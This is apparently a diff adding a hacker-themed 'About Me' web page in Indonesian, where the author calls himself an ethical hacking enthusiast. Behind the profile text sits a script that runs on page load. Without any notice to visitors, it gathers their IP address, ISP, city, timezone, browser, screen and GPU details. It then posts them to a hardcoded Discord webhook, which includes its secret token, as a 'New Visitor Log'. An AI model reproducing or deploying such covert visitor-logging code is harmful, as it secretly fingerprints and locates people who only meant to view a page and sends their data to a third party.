@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>About Me - Hacker Style</title>
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+        
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+        
+        body {
+            font-family: 'Share Tech Mono', monospace;
+            color: red;
+            background-color: black;
+            text-align: center;
+        }
+        
+        .blink {
+            animation: blink 0.8s infinite;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 id="typing-text"></h1>
+        <img src="https://cdn.discordapp.com/attachments/1297594228997619826/1339182972649340948/6cbcc4aa-546e-422c-8ec4-715a806b731d-removebg-preview.png?ex=67d011d5&is=67cec055&hm=ad04c9f84cf1db1ae3cbd8265ab6af76efb23349769e872dd9e9ebef2cbefb27&" alt="Hacker Image" class="profile-img">
+        <p class="intro">Saya adalah seorang penggemar dunia cybersecurity dan etikal hacking. 
+        Menjelajahi dunia maya dengan kode dan keamanan adalah passion saya.</p>
+        <p class="motto">"Code is Power, Security is Priority."</p>
+    </div>
+<script>
+    async function getDeviceInfo() {
+        // Ambil informasi OS, Browser, dan Resolusi Layar
+        const userAgent = navigator.userAgent;
+        const platform = navigator.platform;
+        const browser = (() => {
+            if (userAgent.includes("Firefox")) return "Mozilla Firefox";
+            if (userAgent.includes("Edg")) return "Microsoft Edge";
+            if (userAgent.includes("Chrome")) return "Google Chrome";
+            if (userAgent.includes("Safari")) return "Apple Safari";
+            if (userAgent.includes("Opera") || userAgent.includes("OPR")) return "Opera";
+            return "Unknown Browser";
+        })();
+        const screenResolution = `${window.screen.width}x${window.screen.height}`;
+        const platformType = /Mobi|Android/i.test(userAgent) ? "Mobile" : "Desktop";
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+        // Ambil informasi GPU (Renderer & Vendor)
+        let gpuRenderer = "Unknown";
+        let gpuVendor = "Unknown";
+
+        try {
+            const canvas = document.createElement("canvas");
+            const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+
+            if (gl) {
+                const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+                if (debugInfo) {
+                    gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                }
+            }
+        } catch (error) {
+            console.error("GPU Info Error:", error);
+        }
+
+        // Ambil IP, ISP, Region, dan Kota
+        try {
+            const response = await fetch("https://ipapi.co/json/");
+            const data = await response.json();
+            const ip = data.ip || "Unknown";
+            const isp = data.org || "Unknown ISP";
+            const region = data.region || "Unknown Region";
+            const city = data.city || "Unknown City";
+
+            // Kirim data ke webhook Discord
+            const webhookURL = "https://discord.com/api/webhooks/1343757462083207289/o_AHLkcQKH1emi2rwfQsp2hn6ebE02K458jd4SgWZGOgsUJAZlZR0BNuxQaPHeGGWEe4";
+
+            const embedData = {
+                embeds: [{
+                    title: "New Visitor Log",
+                    color: 16711680, // Warna merah (hex: #FF0000)
+                    fields: [
+                        { name: "IP Address", value: `\`${ip}\``, inline: true },
+                        { name: "ISP", value: `\`${isp}\``, inline: true },
+                        { name: "Region", value: `\`${region}\``, inline: true },
+                        { name: "City", value: `\`${city}\``, inline: true },
+                        { name: "Timezone", value: `\`${timezone}\``, inline: true },
+                        { name: "User Agent", value: `\`${userAgent}\``, inline: false },
+                        { name: "Platform", value: `\`${platform}\``, inline: true },
+                        { name: "Platform Type", value: `\`${platformType}\``, inline: true },
+                        { name: "Browser", value: `\`${browser}\``, inline: true },
+                        { name: "Screen Resolution", value: `\`${screenResolution}\``, inline: true },
+                        { name: "GPU Vendor", value: `\`${gpuVendor}\``, inline: true },
+                        { name: "GPU Renderer", value: `\`${gpuRenderer}\``, inline: true }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(embedData)
+            });
+
+        } catch (error) {
+            console.error("Error fetching IP or ISP:", error);
+        }
+    }
+
+    getDeviceInfo();
+</script>
+</body>
+</html>
